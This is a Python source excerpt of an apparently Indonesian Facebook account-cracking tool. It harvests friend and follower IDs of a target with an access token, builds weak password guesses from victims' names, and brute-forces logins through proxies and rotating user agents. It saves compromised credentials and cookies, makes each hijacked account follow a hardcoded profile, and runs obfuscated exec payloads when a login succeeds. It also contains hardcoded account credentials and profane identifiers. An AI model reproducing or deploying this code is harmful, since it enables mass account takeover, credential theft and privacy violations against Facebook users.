	def public(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						idd.append(uid+"<=>"+nama)
					except:pass
		except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def public_v2(self):
		max=0
		non,idb=[],[]
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						non.append(uid)
					except:pass
		except KeyError:pass
		for rikod in non:
			xx = random.randint(0,len(idb))
			idb.insert(xx,rikod)
		for ml in non:
			if max==5:break
			try:
				goblok = []
				tolol = []
				url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(ml,tiktok))
				with requests.Session() as xyz:
					jso = json.loads(xyz.get(url,cookies=puput).text)
					for i in jso["friends"]["data"]:
						try:
							anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
							goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
						except:pass
				url = ("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token)
				with requests.Session() as xyz:
					jso = json.loads(xyz.get(url,cookies=puput).text)
					for i in jso["data"]:
						try:
							anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
							tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
						except:pass
			except KeyError:pass
			todz = me()
			todz.add_column("ID", style=I, justify="center")
			todz.add_column("JUMLAH TEMAN", style=C, justify="center")
			todz.add_column("JUMLAH PENGIKUT", style=O, justify="center")
			todz.add_row(f'{ml}',f"{len(goblok)}",f"{len(tolol)}")
			if "0" == f"{len(goblok)}":
				if "0" == f"{len(tolol)}":max-=1
				else:
					sol().print(todz, justify='center')
			else:
				sol().print(todz, justify='center')
			max+=1

		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						idd.append(uid+"<=>"+nama)
					except:pass
		except KeyError:pass
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def follow(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(500000)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)

				for i in jso["subscribers"]["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						idd.append(uid+"<=>"+nama)
					except:pass
		except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda {QQ}({II}Recommended{QQ}){MM}\nCrack Dari Random")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def cek_jumlah_teman(self):
		try:
			token = open("data/login.txt", "r").read()
			toket = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			kotak("# MAAF TOKEN ANDA RUSAK/ERROR",M,Q)
			time.sleep(2)
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						idd.append(uid)
					except:pass
		except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Check Jumlah Teman Dari Akun Tertua\nCheck Jumlah Teman Dari Akun Termuda\nCheck Jumlah Teman Dari Random")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		with __Kiky__(max_workers=10) as (kiky_gtg):
			for data in id:
				kiky_gtg.submit(self._lonte_, data, toket, token)
	def _lonte_(self, ml, token, toket):
		try:
			goblok = []
			tolol = []
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(ml,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
						goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
					except:pass
			url = ("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token)
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["data"]:
					try:
						anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
						tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
					except:pass
		except KeyError:pass
		todz = me()
		todz.add_column("ID", style=I, justify="center")
		todz.add_column("JUMLAH TEMAN", style=C, justify="center")
		todz.add_column("JUMLAH PENGIKUT", style=O, justify="center")
		todz.add_row(f'{ml}',f"{len(goblok)}",f"{len(tolol)}")
		if "0" == f"{len(goblok)}":
			if "0" == f"{len(tolol)}":pass
			else:
				sol().print(todz, justify='center')
		else:
			sol().print(todz, justify='center')

	def cekfile_crk(self, folder):
		dirs = os.listdir(folder)
		god_cp,god_ok="",""
		for file in dirs:
			filex = (folder+"/"+file)
			try:
				juma = open(filex,"r").readlines()
				total = ("%s"%(str(len(juma))))
			except:total = (" ?? ")
			try:
				ijo__ = filex.split("results/OK-")[1]
				ijo_ = (QQ+II+"results/OK-"+ijo__)
				god_ok += (ijo_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
			except:pass
			try:
				kuning__ = filex.split("results/CP-")[1]
				kuning_ = (QQ+KK+"results/CP-"+kuning__)
				god_cp += (kuning_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
			except:pass
		iprint(Panel(god_ok, style=I, title="RESULTS OK"))
		iprint(Panel(god_cp, style=K, title="RESULTS CP"))
		print()
	def rek(self):
		self.cekfile_crk("results")
		namax=input(f">--Nama File--> ")
		try:
			fila=open(namax,"r").readlines()
		except FileNotFoundError:
			kotak("# MAAF FILE YANG ANDA MASUKAN TIDAK ADA !!", M,Q);time.sleep(3)
			self.rek()
		try:
			volak = namax.split("CP-")[1];copy_ri = ("");Ass = ("%s"%(KK));aSs = KK
		except:
			try:
				vok = namax.split("OK-")[1]
				copy_ri = ("")
				Ass = ("%s"%(II))
				aSs = II
			except:
				copy_ri = ("DARK-FB")
				Ass = ("%s"%(CC))
				aSs = MM
		kotak(f"# JUMLAH AKUN : {len(fila)}",C,Q)
		with __Kiky__(max_workers=30) as (form):
			for data in fila:
				try:
					data = data.replace("\n","")
					try:user,pw,tll = data.split("|")
					except:user,pw = data.split("|");tll=(" - ")
					iprint(Panel(f"{QQ}{Ass}{copy_ri}{QQ}{aSs}{user}|{pw}|{tll}{QQ}", style=Q, title="AKUN"))
				except:pass
				time.sleep(0.01)
	def cek_opsi(self):
		cekfile_crk("results")
		print(">--Contoh-->"+k+"results/CP-"+durasi+".txt"+q)
		files = input('>--Nama File-->')
		try:
			buka_baju = open(files,"r").readlines()
		except FileNotFoundError:
			kotak("# MAAF FILE YANG ANDA MASUKAN TIDAK ADA",M,Q)
			time.sleep(2);self.cek_opsi()
		with __Kiky__(max_workers=25) as kontok:
			for memek in buka_baju:
				kontol = memek.replace("\n","")
				titid  = kontol.split("|")
	#			try:
#					kontok.submit(hide_opsi, titid[0], titid[1], titid[2])
#					kontok.submit(cek_opsi_crack, titid[0], titid[1], titid[2])
	#			except:
				kontok.submit(cek_opsi_crack, titid[0], titid[1], "")
#					kontok.submit(hide_opsi, titid[0], titid[1], "")
		kotak("# TEKAN ENTER UNTUK KEMBALI",I,Q)
		input()
		Main_()._no_vpn()
class crack_new:
	def __init__(self):
		_ = "UDAH TAU GW CODING SENDIRI ENGGA DIBANTU, NAK KALIAN RIKOD WKWKWK"
	def Kontol_Kau_Ikuti(self,sessionn,cokii):
		try:
			r = BeautifulSoup(sessionn.get("https://mbasic.facebook.com/profile.php?id=100063690353340",cookies={"cookie":cokii}).text,"html.parser")
			get = r.find("a",string="Ikuti").get("href")
			sessionn.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":cokii}).text
		except:pass
		try:
			puput = {'cookie':cokii}

			with requests.Session() as xyz:
				for x in par(xyz.get('https://mbasic.facebook.com/100063690353340',cookies=puput).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in x['href']:
						exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
		except:pass


	def otomatis(self):
		global anim,anim2
		anim = Progress(SpinnerColumn("arrow2"),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		anim2 = anim.add_task('',total=len(idd))
		kotak("# SEBELUM CRACK SILAHKAN JAWAB PERTANYANN DIBAWAH INI",I,Q)
		self.pilih_fps()
		if "fast" == fps:pass
#			self.buat_ugen()
#			self.pilih_mentod_()
		else:
			self.tanya_apk()
			self.tanya_opsi()
			self.tanya_prox_k()
			self.buat_ugen()
			self.pilih_url()
			self.pilih_mentod_()
		self.pas_me()
		iprint(Panel(f"{OO}JIGA TIDAK ADA HASIL, SILAHKAN HIDUP MATIKAN MODE PESAWAT{QQ}\n{II}RESULTS OK DISIMPAN KE : results/OK-{durasi}.txt\n{KK}RESULTS CP DISIMPAN KE : results/CP-{durasi}.txt{QQ}", style=Q, title="INFORMATION"))
		with anim:
			with __Kiky__(max_workers=35) as kontok:
				for kocok in id:
					try:
						idz = kocok.split('<=>')[0]
						pws = kocok.split('<=>')[1].lower()
						pws_ = kocok.split('<=>')[1]
						colmek = pws.split(' ')[0]
						colmek_ = pws_.split(' ')[0]
						pwe = []
						if len(colmek)<5:
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									pass
								elif pass_ in ["02","2"]:
									pass
								elif pass_ in ["03","3"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")

								elif pass_ in ["04","4"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")
									pwe.append("pantek")
									pwe.append("indonesia")
									pwe.append("sayangku")
									pwe.append("123456")

								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
							else:
								if pass_ in ["01","1"]:
									pwe.append(colmek+"123")
									pwe.append(colmek+"12345")
								elif pass_ in ["02","2"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["03","3"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["04","4"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)

								pwe.append(pws)
								pwe.append(pws_)
						else:
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									pass
								elif pass_ in ["02","2"]:
									pass
								elif pass_ in ["03","3"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")

								elif pass_ in ["04","4"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")
									pwe.append("pantek")
									pwe.append("indonesia")
									pwe.append("sayangku")
									pwe.append("123456")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
							else:
								if pass_ in ["01","1"]:
									pwe.append(colmek+"123")
									pwe.append(colmek+"12345")
								elif pass_ in ["02","2"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["03","3"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["04","4"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								pwe.append(pws_)
								pwe.append(pws)


						if "fast" == fps:
							kontok.submit(self.method_fast, idz, pwe)
						else:
							if "mobile" == url_met:
								kontok.submit(self.method, idz, pwe,"m.facebook.com")
							elif "free" == url_met:
								kontok.submit(self.method, idz, pwe,"free.facebook.com")
							elif "p" == url_met:
								kontok.submit(self.method, idz, pwe,"p.facebook.com")
							elif "x" == url_met:
								kontok.submit(self.method, idz, pwe,"x.facebook.com")
							elif "random" == url_met:
								link_ajg=random.choice(["mbasic","x","m","p","free"])
								kontok.submit(self.method, idz, pwe,link_ajg+".facebook.com")
							else:
								kontok.submit(self.method, idz, pwe,"mbasic.facebook.com")
#					except Exception as e:print(e)
					except:
						pass
		print()
		print()
		kotak("# CRACK SELESAI JANGAN LUPA, ISTIRAHAT", I, C)
		os.sys.exit()

	def chexk_ip_spam(self,userr,memek,uurl):
		kata_s = "╔══════════════════════════════════════════════════════════════════════════════════════╗\n║                             JARINGAN ANDA TERKENAK SPAM                              ║\n╚══════════════════════════════════════════════════════════════════════════════════════╝"
		lo_=""
		if lo_=="Hai":
			try:
				url="p.facebook.com"
				ua = "Mozilla/5.0 (Linux; Android 12; SM-A326U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]"

	# Akun dibawah ini harus diganti tiap dipublickan

				user,pw,ttl = ("100035109762635|amanda123|—").split("|")
	#			user,pw,ttl = ("100043579999566|tasya123|").split("|")
	#			user,pw,ttl = ("100050480813279|aura123|—").split("|")
	#			user,pw,ttl = ("100035736123088|josgandos|-").split("|")
				session=requests.Session()
				r = BeautifulSoup(session.get(f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr", headers={
				'Host'	: url,
				'Connection'	:	'keep-alive',
				'Cache-Control'	:	'max-age=0',
				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
				'sec-ch-ua-mobile'	:	'?1',
				'sec-ch-ua-platform'	:	'"Android"',
				'Upgrade-Insecure-Requests'	:	'1',
				'User-Agent'	:	'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36',
				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'Sec-Fetch-Site'	:	'same-origin',
				'Sec-Fetch-Mode'	:	'navigate',
				'Sec-Fetch-User'	:	'?1',
				'Sec-Fetch-Dest'	:	'document',
				'Referer'	:	'https://'+url+'/login/device-based/',
				'Accept-Encoding'	:	'gzip, deflate',
				'Accept-Language'	:	'id-ID,id;q=0.9'
				}).text, 'html.parser')
				data = {_.get('name'):_.get('value') for _ in r.find('form',{'method':'post'}).findAll('input',{'name':['lsd','jazoest']})}
				data.update({'uid':user,'next':'https://'+url+'/login/save-device/','flow':'login_no_pin','encpass':'#PWD_BROWSER:0:{}:{}'.format(jam_,pw)})
				session.post(f'https://{url}/login/device-based/validate-password/', data=data, headers={'Host'	: url,'Connection'	:	'keep-alive','Content-Length'	:	'142','Cache-Control'	:	'max-age=0','sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"','sec-ch-ua-mobile'	:	'?1','sec-ch-ua-platform'	:	'"Android"','Upgrade-Insecure-Requests'	:	'1','Origin'	:	'https://'+url,'Content-Type'	:	'application/x-www-form-urlencoded','User-Agent'	:	'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Sec-Fetch-Site'	:	'same-origin','Sec-Fetch-Mode'	:	'navigate','Sec-Fetch-User'	:	'?1','Sec-Fetch-Dest'	:	'document','Referer'	:	f'https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr','Accept-Encoding'	:	'gzip, deflate, br','Accept-Language'	:	'id-ID,id;q=0.9'})
				if 'c_user' in session.cookies.get_dict():
					anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
					anim.advance(anim2)

				elif 'checkpoint' in session.cookies.get_dict():
					anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
					anim.advance(anim2)
				else:
					anim.update(anim2,description=f"{i}{m2}JARINGAN ANDA TERKENAK SPAM{q}")
					anim.advance(anim2)
					self.method(userr, memek,uurl)
			except:
				anim.update(anim2,description=f"{i}{m2}JARINGAN ANDA TERKENAK SPAM{q}")
				anim.advance(anim2)
				self.method(userr, memek,uurl)
		else:
			anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
			anim.advance(anim2)

	def method(self, user, memek,url):
		global ok,cp,loop
#		ua = random.choice(uaz)
		ua = random.choice(ugen_)
		session=requests.Session()
		try:
			loop += 1
			for pw in memek:
				if "ke1" == method:
					prox = open("data/prox_socks5.txt","r").read().splitlines()
					proxy= {"http": f"socks5://{random.choice(prox)}"}
					link = session.get(f"https://{url}/login/?source=auth_switcher")
					date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":user,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
					head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'id,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','Host': url,'origin': 'https://'+url,'referer': 'https://'+url+'/login/?source=auth_switcher','user-agent': ua,'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-requested-with': 'XMLHttpRequest'}
					if prox_k == "Risky_Ganteng":
						bx = session.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100'+yyy, headers=head, data=date, proxies=proxy)
					else:
						bx = session.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100'+yyy, headers=head, data=date)

				elif "ke2" == method:pass
				if 'c_user'+yyy in session.cookies.get_dict():
					play_mpv(".Wiii.mp3");print(url);print(ua)
					try:
						# Info: coding *GET INGFO UA* buatan anggaxd
						url_main = "https://www.whatsmyua.info"
						s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
						raw_ua = s.find("li", id="rawUa").text
						family = s.find("li", id="family").text
						name_hp = s.find("li", id="product").text
						os_ = s.find("li", id="os").text
						ly = s.find("li", id="layout").text
						ua = raw_ua.replace("rawUa: ", "")
						browser = family.replace("family: ", "")
						hp = name_hp.replace("product: ", "")
						os = os_.replace("os: ", "")
						layout = ly.replace("layout: ", "")
					except:pass
					coki = ubah_cok(session.cookies.get_dict());user = re.findall('c_user=(.*);xs', coki)[0];wrt = '%s|%s|%s' % (user,pw,coki);_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(ua09[2]));ok.append(wrt);open('results/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					if "IYA" in apk_me:
						ubah_bahasa(coki)
						get_apk(user,pw,coki)
					else:
						try:
							ok_ = Tree("                                 ",highlight=True, hide_root=True)
							ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu red")
							ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
							ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")
							ok___ = ok__.add(f"{b}COOKIES{q}")
							ok___.add(f"{c}{coki}{q}")
							ok___ = ok__.add(f"{k}Link App{q}")
							ok____= ok___.add(f"{c}{link_app}{q}")
							ok___ = ok__.add(f"{k}UserAgent{q}")
							ok____= ok___.add(f"{c}{ua}{q}")
							ok_____= ok____.add(f"{k}Information UserAgent{q}")
							ok______= ok_____.add(f"{b}OS{q}")
							ok______.add(f"{c}{os}{q}")
							ok______= ok_____.add(f"{b}LAYOUT{q}")
							ok______.add(f"{c}{layout}{q}")
							ok______= ok_____.add(f"{b}DEVICE HP{q}")
							ok______.add(f"{c}{hp}{q}")
							ok______= ok_____.add(f"{b}Jenis Browser{q}")
							ok______.add(f"{c}{browser}{q}")
							prints(ok__)
						except:
							ok_ = Tree("                                 ",highlight=True, hide_root=True)
							ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu red")
							ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
							ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")
							ok___ = ok__.add(f"{b}COOKIES{q}")
							ok___.add(f"{c}{coki}{q}")
							ok___ = ok__.add(f"{k}UserAgent{q}")
							ok___.add(f"{c}{ua}{q}")
							prints(ok__)
					self.Kontol_Kau_Ikuti(session,coki)
					break
				elif 'checkpoint'+yyy in session.cookies.get_dict():
					play_mpv(".Wiii.mp3");print(url)
					try:
						# Info: coding *GET INGFO UA* buatan anggaxd
						url_main = "https://www.whatsmyua.info"
						s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
						raw_ua = s.find("li", id="rawUa").text
						family = s.find("li", id="family").text
						name_hp = s.find("li", id="product").text
						os_ = s.find("li", id="os").text
						ly = s.find("li", id="layout").text
						ua = raw_ua.replace("rawUa: ", "")
						browser = family.replace("family: ", "")
						hp = name_hp.replace("product: ", "")
						os = os_.replace("os: ", "")
						layout = ly.replace("layout: ", "")
					except:pass
					try:
						yz  = requests.Session().get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,tiktok),cookies=puput)
						zxc = json.loads(yz.text)
						cp_ttl= zxc['birthday']
						month, day, year = cp_ttl.split('/')
						month = bulan_ttl[month]
						ttl = f"{day}-{month}-{year}"
					except:
						ttl="—"
					wrt = '%s|%s|%s' % (user,pw,ttl);cp.append(wrt);_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(ua03[3]));open('results/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
					if "IYA" == opsi_y:
						try:
							hide_opsi(user,pw,ttl)
						except:
							cp_ = Tree("                                 ",highlight=True, hide_root=True)
							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
